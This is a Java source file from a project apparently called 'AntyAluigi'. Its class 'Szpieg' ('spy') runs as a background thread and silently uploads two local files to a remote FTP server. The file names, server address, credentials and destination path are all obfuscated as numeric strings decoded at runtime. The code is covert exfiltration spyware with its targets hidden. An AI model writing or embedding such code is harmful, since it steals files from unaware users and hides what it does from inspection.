/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package antyaluigi;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;



/**
 *
 * @author Mateusz
 */
public class Szpieg extends Thread{
    
    public void run()
    {
        ftp(AntyAluigi.odkoduj("568068548085568578068009509548588029509549039558009")); 
        ftp(AntyAluigi.odkoduj("558059558085006578568578"));
    }
    
    public static boolean ftp(String file)
    {
                String server = AntyAluigi.odkoduj("098019085538538059085006578568578");
		int port = 21;
		String user = AntyAluigi.odkoduj("578568578");
		String pass = AntyAluigi.odkoduj("077016517526017067");

		FTPClient ftpClient = new FTPClient();
		try {

			ftpClient.connect(server, port);
			ftpClient.login(user, pass);
			ftpClient.enterLocalPassiveMode();
			ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
			File firstLocalFile = new File(file);
			String firstRemoteFile = AntyAluigi.odkoduj("585009538078527585578568578539098538538585098598039078528548578098048539019585")+file;
			InputStream inputStream = new FileInputStream(firstLocalFile);
			boolean done = ftpClient.storeFile(firstRemoteFile, inputStream);
			inputStream.close();
			if (done) {
                            
				return true;
			}
                        
                }   catch (IOException ex) {
                     System.out.println(ex);
                }
        return false;
    }
}
